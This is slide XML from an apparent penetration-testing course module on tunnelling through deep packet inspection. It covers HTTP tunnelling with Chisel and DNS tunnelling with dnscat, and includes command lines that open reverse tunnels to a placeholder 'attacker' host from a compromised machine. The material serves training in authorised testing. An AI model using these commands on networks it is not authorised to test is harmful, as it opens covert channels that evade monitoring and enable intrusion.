          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="77" name="Text 75"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="800100" y="8075786"/>
            <a:ext cx="16344900"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8C0CF"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Module weightings: information not defined in the official exam outline.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ORIENTATION</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When reachability exists but inspection blocks you</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MODULE 17 SOLVED</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Reachability — a route exists, but the tester's machine cannot use it directly. Port forwarding and SSH tunnelling answered that.</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MODULE 18 SOLVES</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6664300"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Inspection — a route exists and is used, but something in the path examines the traffic and rejects it.</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ANSWER</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="12290375" y="5384006"/>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Ride the tunnel inside a protocol the inspection device is already configured to permit.</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43944" y="3960986"/>
            <a:ext cx="2200111"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18.1</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1650" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1710296" y="4475336"/>
            <a:ext cx="14867409" cy="738188"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="25400" tIns="25400" rIns="25400" bIns="25400" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="90741"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="5250" b="1" spc="-37" kern="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F5F7FB"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Tunneling Through Deep Packet Inspection</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="5250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2767013" y="5442124"/>
            <a:ext cx="12753975"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Learn about HTTP tunnelling and perform it with Chisel, then learn about DNS tunnelling and perform it with dnscat.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44546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15971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Framing the problem</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What deep packet inspection actually blocks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Deep packet inspection examines the content of traffic, not merely its source, destination, or port. A tunnel that would pass a simple firewall can still be identified and blocked once its content is inspected.</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SIMPLE FORWARDING FAILS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1038225"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raw tunnel's traffic pattern often looks nothing like the protocol its port suggests, which is exactly what deep inspection is built to notice.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GENERAL ANSWER</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Both objectives in this module answer with the same idea: carry the tunnel inside a protocol the inspection device is already configured to allow through.</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0558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3380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18.1 · Task 1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Learning about HTTP tunnelling</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HTTP traffic is permitted almost everywhere, since blocking it would break ordinary web browsing entirely. Wrapping tunnelled traffic inside HTTP requests and responses lets it travel through inspection devices that would otherwise flag or block it.</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HTTP SPECIFICALLY</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is the protocol least likely to be blocked outright, since doing so would break normal business use of the internet.</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17's SSH tunnelling — the same reachability goal, now wrapped in a carrier protocol inspection is unlikely to reject.</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504629"/>
            <a:ext cx="3029843"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590354"/>
            <a:ext cx="275878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18.1 · Task 2 of 4</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="800100" y="3147566"/>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Performing HTTP tunnelling with Chisel</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="800100" y="3814316"/>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Chisel establishes a tunnel between a client and server component, carrying arbitrary traffic wrapped inside HTTP so it passes through inspection devices configured to permit ordinary web traffic.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2175" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Shape 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="800100" y="4862959"/>
            <a:ext cx="16687800" cy="876300"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 13043"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="000000">
              <a:alpha val="35000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="2A2F3A"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1019175" y="5043934"/>
            <a:ext cx="16750284" cy="552450"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="25400" tIns="25400" rIns="25400" bIns="25400" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1725" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFD9BF"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="A6A6A6"/>
                </a:highlight>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>chisel server -p 8080 --reverse chisel client attacker:8080 R:socks</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1725" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="800100" y="5986909"/>
            <a:ext cx="823912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1038225" y="622503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1" name="Text 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1038225" y="654412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turns Objective 18.1's HTTP theory into a working tool, directly usable once a foothold exists behind an inspecting device.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1875" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Shape 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9248775" y="5986909"/>
            <a:ext cx="8239125"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9486900" y="622503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4" name="Text 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9486900" y="6544121"/>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Inspection sophisticated enough to notice HTTP traffic that does not resemble genuine browsing patterns, even while nominally using the right protocol.</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03497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764077"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18.1 · Task 3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Learning about DNS tunnelling</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DNS queries are necessary for almost any network activity to function at all, making DNS traffic even less likely to be blocked outright than HTTP. Encoding tunnelled data inside DNS queries and responses provides a route when even HTTP is filtered.</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DNS SPECIFICALLY</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Blocking DNS resolution entirely breaks essentially all network activity, making it an even more reliable carrier than HTTP in heavily filtered environments.</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TRADE-OFF</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DNS tunnelling is typically far slower than HTTP tunnelling, given the small size of individual DNS query and response fields.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="18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671316"/>
            <a:ext cx="303854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757041"/>
            <a:ext cx="276775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18.1 · Task 4 of 4</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="800100" y="33142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Performing DNS tunnelling with dnscat</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="800100" y="39810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dnscat establishes a command channel encoded inside DNS queries and responses, providing connectivity even in environments where every other protocol is filtered except name resolution itself.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2175" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Shape 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="800100" y="5029646"/>
            <a:ext cx="16687800" cy="876300"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 13043"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="000000">
              <a:alpha val="35000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="2A2F3A"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1019175" y="5210621"/>
            <a:ext cx="16750284" cy="552450"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="25400" tIns="25400" rIns="25400" bIns="25400" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1725" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFD9BF"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="A6A6A6"/>
                </a:highlight>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>dnscat2-server tunnel.example.com dnscat --dns server=attacker,port=53</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1725" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="800100" y="6153596"/>
            <a:ext cx="8239125" cy="1462088"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 10423"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF">
              <a:alpha val="2000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="2A2F3A"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1038225" y="6391721"/>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1" name="Text 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1038225" y="6710809"/>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is the deepest fallback in the course's tunnelling toolkit — usable when HTTP tunnelling itself has been blocked or detected.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1875" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Shape 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9248775" y="6153596"/>
            <a:ext cx="8239125" cy="1462088"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 10423"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF">
              <a:alpha val="2000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="2A2F3A"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9486900" y="6391721"/>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4" name="Text 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9486900" y="6710809"/>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Environments with DNS-specific inspection or restricted resolvers, which can still detect or block unusually shaped DNS query patterns.</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30711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802410"/>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HTTP tunnelling versus DNS tunnelling</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="800100" y="4469160"/>
            <a:ext cx="7581900"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4707285"/>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HTTP (CHISEL)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1038225" y="5026372"/>
            <a:ext cx="7318820"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Faster, and sufficient against most network-level filtering. The first approach to try when a route through HTTP exists.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1875" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8534400" y="4469160"/>
            <a:ext cx="1219200" cy="1500188"/>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469160"/>
            <a:ext cx="7581900" cy="1462088"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 10423"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF6A00">
              <a:alpha val="6000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="B85100"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10144125" y="4707285"/>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DNS (DNSCAT)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10144125" y="5026372"/>
            <a:ext cx="7318820"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Slower, but reaches through environments where even HTTP is blocked — the deepest fallback when every other protocol is filtered.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1875" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="800100" y="6178897"/>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Watch for: reaching for dnscat by default. Its slowness makes it the fallback, not the first choice, whenever HTTP tunnelling remains viable.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="21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18.1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Tunneling Through Deep Packet Inspection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HTTP TUNNELLING</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Wraps traffic in a protocol almost never blocked outright; performed in practice with Chisel.</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DNS TUNNELLING</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deeper fallback when even HTTP is filtered, at the cost of speed; performed in practice with dnscat.</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140422"/>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APPLIED SCENARIO · DISCUSSION</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1650" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="800100" y="363572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Choosing a tunnel when the network is heavily filtered</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="800100" y="4302472"/>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compromised host sits behind a network egress filter. Standard SSH tunnelling from Module 17 is blocked outright. HTTP traffic to external destinations appears to reach its target, but DNS queries also resolve successfully for every domain tested.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2175" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="800100" y="5351115"/>
            <a:ext cx="5435575" cy="1795463"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 8488"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF">
              <a:alpha val="2000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="2A2F3A"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1038225" y="5589240"/>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8" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1038225" y="5908328"/>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Given HTTP appears to reach its destination, which tool from this module would you try first, and why?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1875" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6426175" y="5351115"/>
            <a:ext cx="543557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6664300" y="5589240"/>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1" name="Text 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6664300" y="5908328"/>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If HTTP tunnelling were later found to be detected and blocked, what would justify switching to DNS tunnelling despite its cost?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1875" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Shape 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="12052250" y="5351115"/>
            <a:ext cx="5435650"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12290375" y="5589240"/>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4" name="Text 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="12290375" y="5908328"/>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How does this scenario connect back to Module 17's reachability-versus-inspection distinction?</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318370"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03262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1 of 2</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Trying HTTP tunnelling before DNS tunnelling</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Attempt Chisel first whenever a route through HTTP appears viable, reserving dnscat for environments where HTTP itself is confirmed blocked or detected.</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Confirm what actually reaches the destination before choosing a tunnelling protocol, rather than defaulting to the most resilient option out of caution alone.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Defaulting to DNS tunnelling costs meaningful speed for no benefit when HTTP would have worked just as well.</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4262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5687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2 of 2</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Documenting the full tunnelling chain</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Record which carrier protocol and tool were used, alongside any SSH or forwarding layers from Module 17 the tunnel rides on top of — the full chain, not just the outermost layer.</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tunnel built from several stacked layers is difficult to reconstruct from memory later, both for the tester and for anyone reviewing the engagement.</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17's tunnel topology documentation practice, and Module 4's broader note-taking discipline.</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5814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ACRONYM SPOTLIGHT</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1650" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="800100" y="4076700"/>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Terms introduced in Module 18</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="800100" y="4743450"/>
            <a:ext cx="2590800" cy="500063"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF6A00">
              <a:alpha val="18000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="800100" y="5233988"/>
            <a:ext cx="2590800" cy="9525"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="B85100"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="952500" y="4857750"/>
            <a:ext cx="236372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Term</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3390900" y="4743450"/>
            <a:ext cx="4686300" cy="500063"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF6A00">
              <a:alpha val="18000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3390900" y="5233988"/>
            <a:ext cx="4686300" cy="9525"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="B85100"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3543300" y="4857750"/>
            <a:ext cx="452208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is</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Shape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8077200" y="4743450"/>
            <a:ext cx="9410700" cy="500063"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF6A00">
              <a:alpha val="18000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Shape 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8077200" y="5233988"/>
            <a:ext cx="9410700" cy="9525"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="B85100"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8229600" y="4857750"/>
            <a:ext cx="9388221"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Where it appears</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Shape 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="800100" y="5243513"/>
            <a:ext cx="2590800" cy="485775"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF">
              <a:alpha val="2000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Shape 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="800100" y="5719763"/>
            <a:ext cx="2590800" cy="9525"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="2A2F3A"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="952500" y="5348288"/>
            <a:ext cx="23637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DPI</a:t>
